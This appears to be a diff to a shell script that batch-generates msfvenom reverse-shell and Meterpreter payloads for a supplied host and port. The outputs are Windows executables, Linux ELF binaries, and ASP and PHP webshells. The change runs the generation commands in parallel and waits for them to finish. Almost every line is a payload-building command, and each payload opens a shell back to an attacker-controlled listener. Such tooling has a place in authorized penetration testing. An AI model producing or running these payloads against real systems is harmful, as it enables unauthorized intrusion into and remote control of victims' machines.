@@ -14,31 +14,35 @@ fi
 HOST=$1
 PORT=$2
 
+echo "Generating msfvenom payloads for $HOST:$PORT..."
+
 # Windows payloads (staged)
-msfvenom -p windows/meterpreter/reverse_https LHOST=$HOST LPORT=$PORT -f exe > meterp_revhttps_$HOST-$PORT.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > meterp_revtcp_$HOST-$PORT.exe
-msfvenom -p windows/shell/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > shell_revtcp_$HOST-$PORT.exe
+msfvenom -p windows/meterpreter/reverse_https LHOST=$HOST LPORT=$PORT -f exe > meterp_revhttps_$HOST-$PORT.exe &
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > meterp_revtcp_$HOST-$PORT.exe &
 
 # Windows payloads (stageless)
-msfvenom -p windows/meterpreter_reverse_https LHOST=$HOST LPORT=$PORT -f exe > stageless_meterp_revhttps_$HOST-$PORT.exe
-msfvenom -p windows/meterpreter_reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > stageless_meterp_revtcp_$HOST-$PORT.exe
-msfvenom -p windows/shell_reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > stageless_shell_revtcp_$HOST-$PORT.exe
+msfvenom -p windows/meterpreter_reverse_https LHOST=$HOST LPORT=$PORT -f exe > stageless_meterp_revhttps_$HOST-$PORT.exe &
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > stageless_meterp_revtcp_$HOST-$PORT.exe &
+msfvenom -p windows/shell_reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > stageless_shell_revtcp_$HOST-$PORT.exe &
 
 # Linux x86 payloads (both)
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf > meterp_revtcp_$HOST-$PORT.elf
-msfvenom -p linux/x86/shell/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf > shell_revtcp_$HOST-$PORT.elf
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=$HOST LPORT=$PORT -f elf > stageless_shell_revtcp_$HOST-$PORT.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf > meterp_revtcp_$HOST-$PORT.elf &
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf > shell_revtcp_$HOST-$PORT.elf &
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=$HOST LPORT=$PORT -f elf > stageless_shell_revtcp_$HOST-$PORT.elf &
 
 # Webshells (staged)
-msfvenom -p windows/meterpreter/reverse_https LHOST=$HOST LPORT=$PORT -f asp > meterp_revhttps_$HOST-$PORT.asp
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > meterp_revtcp_$HOST-$PORT.asp
-msfvenom -p windows/shell/reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > shell_revtcp_$HOST-$PORT.asp
-msfvenom -p php/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f raw > meterp_revtcp_$HOST-$PORT.php
+msfvenom -p windows/meterpreter/reverse_https LHOST=$HOST LPORT=$PORT -f asp > meterp_revhttps_$HOST-$PORT.asp &
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > meterp_revtcp_$HOST-$PORT.asp &
+msfvenom -p windows/shell/reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > shell_revtcp_$HOST-$PORT.asp &
+msfvenom -p php/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f raw > meterp_revtcp_$HOST-$PORT.php &
 
 # Webshells (stageless)
-msfvenom -p windows/meterpreter_reverse_https LHOST=$HOST LPORT=$PORT -f asp > stageless_meterp_revhttps_$HOST-$PORT.asp
-msfvenom -p windows/meterpreter_reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > stageless_meterp_revtcp_$HOST-$PORT.asp
-msfvenom -p windows/shell_reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > stageless_shell_revtcp_$HOST-$PORT.asp
-msfvenom -p php/meterpreter_reverse_tcp LHOST=$HOST LPORT=$PORT -f raw > stageless_meterp_revtcp_$HOST-$PORT.php
-msfvenom -p php/reverse_php LHOST=$HOST LPORT=$PORT -f raw > stageless_shell_revphp_$HOST-$PORT.php
+msfvenom -p windows/meterpreter_reverse_https LHOST=$HOST LPORT=$PORT -f asp > stageless_meterp_revhttps_$HOST-$PORT.asp &
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > stageless_meterp_revtcp_$HOST-$PORT.asp &
+msfvenom -p windows/shell_reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > stageless_shell_revtcp_$HOST-$PORT.asp &
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$HOST LPORT=$PORT -f raw > stageless_meterp_revtcp_$HOST-$PORT.php &
+msfvenom -p php/reverse_php LHOST=$HOST LPORT=$PORT -f raw > stageless_shell_revphp_$HOST-$PORT.php &
+
+# Wait for child processes
+wait
 
